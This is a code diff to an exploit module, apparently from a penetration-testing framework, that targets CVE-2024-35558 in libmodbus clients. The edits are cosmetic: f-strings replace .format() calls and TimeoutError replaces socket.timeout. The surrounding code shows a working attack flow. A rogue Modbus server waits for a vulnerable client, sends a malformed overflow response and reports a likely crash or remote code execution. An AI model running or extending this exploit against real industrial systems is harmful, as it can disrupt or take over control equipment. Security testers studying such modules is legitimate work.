@@ -91,7 +91,7 @@ class Exploit(Exploit):
             print_info("Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-35558")
             return
 
-        print_status("[CVE-2024-35558] Starting rogue Modbus server on port {} ...".format(self.port))
+        print_status(f"[CVE-2024-35558] Starting rogue Modbus server on port {self.port} ...")
         print_status("[CVE-2024-35558] Waiting for vulnerable libmodbus client to connect ...")
 
         import time
@@ -118,12 +118,12 @@ class Exploit(Exploit):
 
         try:
             conn, addr = srv.accept()
-            print_success("[CVE-2024-35558] Client connected from {}".format(addr))
+            print_success(f"[CVE-2024-35558] Client connected from {addr}")
             data = conn.recv(256)
             if len(data) >= 6:
                 trans_id = struct.unpack_from(">H", data, 0)[0]
                 overflow_resp = make_overflow_response(trans_id)
-                print_status("[CVE-2024-35558] Sending malformed response ({} bytes) ...".format(len(overflow_resp)))
+                print_status(f"[CVE-2024-35558] Sending malformed response ({len(overflow_resp)} bytes) ...")
                 conn.sendall(overflow_resp)
                 time.sleep(0.5)
                 try:
@@ -131,13 +131,13 @@ class Exploit(Exploit):
                     if not client_resp:
                         print_success("[CVE-2024-35558] Client disconnected after overflow — crash/RCE likely triggered!")
                     else:
-                        print_info("[CVE-2024-35558] Client still alive: {}".format(client_resp.hex()[:32]))
+                        print_info(f"[CVE-2024-35558] Client still alive: {client_resp.hex()[:32]}")
                 except Exception:
                     print_success("[CVE-2024-35558] Client connection lost after overflow — exploitation indicator")
             conn.close()
-        except socket.timeout:
+        except TimeoutError:
             print_warning("[CVE-2024-35558] No client connected within 30s — ensure target uses libmodbus < 3.1.10 as client")
         except Exception as exc:
-            print_error("[CVE-2024-35558] Error: {}".format(exc))
+            print_error(f"[CVE-2024-35558] Error: {exc}")
         finally:
             srv.close()
